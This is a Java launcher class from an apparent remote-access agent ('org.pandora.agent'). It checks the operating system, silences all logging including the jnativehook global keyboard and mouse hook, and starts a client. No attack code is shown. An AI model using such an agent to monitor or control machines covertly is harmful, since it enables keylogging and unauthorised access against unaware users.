package org.pandora.agent.launch;

import org.pandora.agent.Client;
import org.jnativehook.GlobalScreen;
import org.pandora.agent.utils.NumberUtils;

import java.lang.reflect.Field;
import java.nio.charset.Charset;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

public class Launch {

    public static void main(String[] args) {
        forceUTF();
        if (!isAllowed())
            return;
        LogManager.getLogManager().reset();
        final Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        if (args.length == 1 && NumberUtils.isInteger(args[0])) {
            new Client().launch(Integer.parseInt(args[0]));
            return;
        }
        new Client().launch(0);
    }

    private static boolean isAllowed() {
        final String version = System.getProperty("os.name").toLowerCase();
        return version.contains("windows") || version.contains("linux") || version.contains("debian") || version.contains("ubuntu") || version.contains("centos");
    }

    private static void forceUTF() {
        System.setProperty("file.encoding", "UTF-8");
        if (getVersion() <= 8) {
            try {
                final Field charset = Charset.class.getDeclaredField("defaultCharset");
                charset.setAccessible(true);
                charset.set(null, null);
            } catch (final IllegalAccessException | NoSuchFieldException ignore) {
            }
        }
    }

    private static int getVersion() {
        String version = System.getProperty("java.version");
        if (version.startsWith("1.")) version = version.substring(2, 3);
        else {
            int dot = version.indexOf(".");
            if (dot != -1) version = version.substring(0, dot);
        }
        return Integer.parseInt(version);
    }
}
